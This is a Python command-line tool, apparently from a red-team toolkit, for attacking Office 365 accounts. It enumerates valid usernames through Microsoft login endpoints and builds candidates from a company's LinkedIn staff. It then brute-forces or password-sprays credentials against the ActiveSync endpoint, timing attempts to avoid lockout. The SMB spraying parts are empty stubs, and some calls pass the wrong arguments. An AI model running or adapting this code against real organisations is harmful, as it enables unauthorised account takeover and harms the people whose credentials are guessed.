#!/usr/bin/env python3
import platform
import re
import os
import subprocess
import socket
import time
from datetime import datetime
from argparse import ArgumentParser
from threading import Thread
import requests
import sys
import platform
from colorama import init, Fore
from time import sleep
import io
from queue import Queue
import concurrent.futures

init()


def switch():
    parser = ArgumentParser()
    parser.add_argument(
        '-m', '--mode', help='bruteforce mode to use [o365|smb|other]', required=False,)
    parser.add_argument(
        '-u', '--username', help='username to test [cannot be used with -uf or --userfile]', required=False)
    parser.add_argument(
        '-p', '--password', help='password to test [cannot be used with -pf or --passfile]', required=False)
    parser.add_argument(
        '-uf', '--userfile', help='list of usernames to test [cannot be used with -u or --username]', required=False)
    parser.add_argument(
        '-pf', '--passfile', help='list of password to test [cannot be used with -p or --password]', required=False)
    parser.add_argument('-policy', '--policy',
                        help='password policy to be applied [attempts,minutes]', required=False)
    parser.add_argument('-v', '--verbose', help='read output to terminal',
                        required=False, action='store_true')
    parser.add_argument(
        '-d', '--domain', help='get domain usernames from linkedin', required=False)
    return parser.parse_args()


def cls():
    os_env = platform.platform()
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')


def banner():
    banner = """

                                     .*..,
                                   ,#*/#(%#.
                                  ,%#%%#%%#
                                .*###@&#/
                ...  ..,,,,,,,*/,**#&&(*,. .,.
            .  ,/**/*/*(*/(#(,,**%%&#&#*****,.  ,
           .  (&%#####%%(&(,,*/#%%#&%#,**/*//(*  *
           #*.  ,%@&@@@@#/(/(%%&#%&#&(/((#/.   **,
           #(***,.,.                    ,*/#(///*
           *#//***,,,.,.,,,***//((((((%%%%###//*/
            #**/,.,,,,.......,***(####((#((#(/**
             #(/*,,,.,.,,,.,,,,**/((##(##(#((**,
              #(**.*,,,,,,*,,,/((((//(##(#(/**,
               ((*,,..,....,,,*//((##%%####/*.
                .(//,**,..**//((##((#%&%#(/*
                   #/#(*(##(((//#%@@%%##(/
                    &%%%#%%%%&@@&@@&&%((*
                  .(/*,,,..,,**/**((((##/,
                  %/,,,..,.,...,*(#%#%(#(/.
                    (#(/***/*//(((#####%*
                          ,/(((//,

                        from nsfLabs
"""
    print(banner)


def brute_office(username, password):
    try:
        print(Fore.YELLOW +
              "Checking credentials {0}:{1}".format(username, password))
        check_user = check_o365(username)
        if(check_user == None):
            print(
                Fore.RED+"[+] Error! Target does not seem to be using Office365")
        elif (check_user == True):
            # TODO: run bruter
            header = {"MS-ASProtocolVersion": "14.0"
                      }
            LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            STATUS_CODES = {"200": "VALID USERPASS",
                            "401": "VALID USERNAME ONLY",
                            "403": "VALID USERPASS WITH 2FA",
                            "404": "INVALID USERNAME"
                            }
            r = requests.options(LOGIN_URL, headers=header,
                                 auth=(username, password), timeout=300)

            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
            print(color+"{}:{} - {}".format(username,
                                            password, STATUS_CODES[str(r.status_code)]))

        elif(check_user == False):
            print(Fore.RED+"[+] Error! Invalid username")
        else:
            print(Fore.RED+"[+] Error! Unknown Error")
            sys.exit(0)

    except KeyboardInterrupt:
        print("[!] Detected Ctrl + C. Shutting down...")
        sys.exit(0)


def sprayAD(host):
    # TODO: run AD spray here
    pass


def check_o365(username):
    if verbose:
        print(Fore.YELLOW + "[!]Checking username: {}".format(username))
    s = requests.session()
    url = 'https://login.microsoftonline.com/getuserrealm.srf?login=%s&json=1' % username
    r = s.get(url)
    res = r.text
    managed, unknown = re.search('"NameSpaceType":"Managed"', res), re.search(
        '"NameSpaceType":"Unknown"', res)
    if unknown:
        return None
    if managed:
        sleep(1)
        uri = 'https://login.microsoftonline.com/common/GetCredentialType'
        username = username.split()
        username = ' '.join(username)
        data = '{"Username": "%s"}' % username
        r = s.post(uri, data=data)
        response = r.text
        valid, invalid = re.search('"IfExistsResult":0,', response), re.search(
            '"IfExistsResult":1,', response)
        if invalid:
            return False
        if valid:
            return True


def hybrid_office_worker(policy, user, _pass):
    attempts = 1
    max_attempts, timelimit = tuple(policy.split(','))
    timelimit = 60*int(timelimit)
    max_attempts = int(max_attempts) - 1

    if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
        # this shows we are spraying a single username against a passfile
        try:
            for password in _pass.readlines():
                # This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(user, password.strip("\n"))
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
        # this shows we are spraying a single password against a userfile
        try:
            for username in user.readlines():
                # This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(username.strip("\n"), _pass)
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
        # this means we are spraying userfile against passfile.
        try:
            for password in _pass.readlines():
                for username in user.readlines():
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    brute_office(username.strip("\n"), password.strip("\n"))
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)

    else:
        print("[!]Unknown input. Check the usage")


def hybrid_smb_worker(policy, username="", password="", userfile="", passfile=""):
    # TODO: Run hybrid bruteforcing here using worker threads
    pass


class check_linkedin:
    def __init__(self, domain):
        self.domain = domain

    def run_check(self):
        base_name = self.domain.split('.')[0]
        try:
            print("Select email format to use")
            print("1. flastname")
            print("2. f.lastname")
            print("3. firstnamelastname")
            print("4. firstname.lastname")
            print("5. lfirstname")
            print("6. l.firstname")
            print("7. lastname.firstname")
            print("8. lastnamefirstname")
            email_format = int(input("> "))
            if email_format not in range(1, 9):
                print("Please enter a valid selection")
                email_format = input("> ")
            elif email_format == 1:
                email_format = '{f}{last}'
            elif email_format == 2:
                email_format = '{f}.{last}'
            elif email_format == 3:
                email_format = '{first}{last}'
            elif email_format == 4:
                email_format = '{first}.{last}'
            elif email_format == 5:
                email_format = '{l}{first}'
            elif email_format == 6:
                email_format = '{l}.{first}'
            elif email_format == 7:
                email_format = '{last}.{first}'
            elif email_format == 8:
                email_format = '{last}{first}'
            cmd = "./generator.py -s -f {0}@{1} {2}".format(
                email_format, self.domain, base_name)
            try:
                p = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, universal_newlines=True)
                print("[**********] Processing... This might take a while")
                if verbose:
                    for line in p.stdout:
                        print(line.strip())
                try:
                    p.wait()
                    with open("names.txt", "r") as usernames:
                        print("Checking username validity")
                        for username in usernames:
                            queue.put(username.strip())
                        self.run_queue(queue)
                except Exception as e:
                    print(e)
            except Exception as e:
                print(e)

        except KeyboardInterrupt:
            print("Keyboard interrupt detected. Shutting down")
            exit(0)
        except Exception as e:
            print(e)
            exit(0)

    def run_queue(self, queue):
        self.queue = queue
        valid_usernames = list()
        print("Hang on, we are almost done here")
        checks = list()
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            while not self.queue.empty():
                user = self.queue.get()
                check = executor.submit(check_o365, user)
                checks.append((check, user))

        for c, u in checks:
            if c.done() and (c.result() == True):
                valid_usernames.append(u)

        if len(valid_usernames) == 0:
            print(Fore.RED + "No valid username found")
            exit(0)
        else:
            try:
                print("[+] Generating valid usernames file...")
                with open("valid_usernames.txt", "w") as users:
                    for line in valid_usernames:
                        line += "\n"
                        users.writelines(line)
                    users.close()
                print(Fore.BLUE + "What next? ")
                print("1. Check generated usernames against a password")
                print("2. Check generated usernames against a password file")
                print("0. Exit")
                choice = int(input("> "))
                if choice not in range(0, 3):
                    print("Please enter a valid selection")
                elif choice == 0:
                    print("Shutting down. Good luck.")
                    exit(0)
                elif choice == 1:
                    password = input("Enter password to try: ")
                    userfile = open("valid_usernames.txt", "r")
                    policy = "60,1"
                    hybrid_office_worker(policy, userfile, password)
                elif choice == 2:
                    passfile = input("Enter path for password file: ")
                    try:
                        passfile = open(passfile, 'r')
                        userfile = open("valid_usernames.txt", "r")
                        policy = "60,1"
                        hybrid_office_worker(policy, userfile, passfile)
                    except Exception as e:
                        print(e)
                        exit(0)
                else:
                    print(Fore.RED + "[!] Unknown error. Shutting down")
                    exit(0)
            except Exception as e:
                print(e)
            finally:
                try:
                    os.remove("names.txt")
                    exit(0)
                except Exception as e:
                    print(e)

        self.queue.join()


if __name__ == '__main__':
    cls()
    banner()

    queue = Queue()
    options = switch()

    mode = options.mode
    username = options.username
    password = options.password
    userfile = options.userfile
    passfile = options.passfile
    policy = options.policy
    verbose = options.verbose
    domain = options.domain

    if username and userfile:
        ArgumentParser().print_usage()
        sys.exit(0)
    if password and passfile:
        ArgumentParser().print_usage()
        sys.exit(0)

    if username and password:
        single_test = True
    else:
        single_test = False

    # Run o365 bruteforce test
    if not mode:
        print(Fore.RED + "Mode selection is required")
        ArgumentParser().print_help()
    if mode == "o365":
        print(Fore.BLUE+"Starting Office 365 Password Spraying/Bruteforce")
        if single_test:
            brute_office(username, password)
        else:
            if username and passfile:
                passfile = open(passfile, 'r')
                hybrid_office_worker(policy, username, passfile)
            elif userfile and password:
                userfile = open(userfile, 'r')
                hybrid_office_worker(policy, userfile, password)
            elif userfile and passfile:
                passfile = open(passfile, 'r')
                userfile = open(userfile, 'r')
                hybrid_office_worker(policy, userfile, passfile)
            else:
                print("[+]Unknown error! Check usage")

    # Run smb spraying test
    if mode == "smb":
        if single_test:
            sprayAD(username, password)
        else:
            hybrid_smb_worker(username, password, userfile, passfile, policy)

    # Run domain check with the Linkedin username generator
    if mode == "other":
        if not domain:
            ArgumentParser().print_usage()
            exit(0)
        else:
            print(Fore.BLUE+"Starting automatic check")
            dom = check_linkedin(domain)
            dom.run_check()
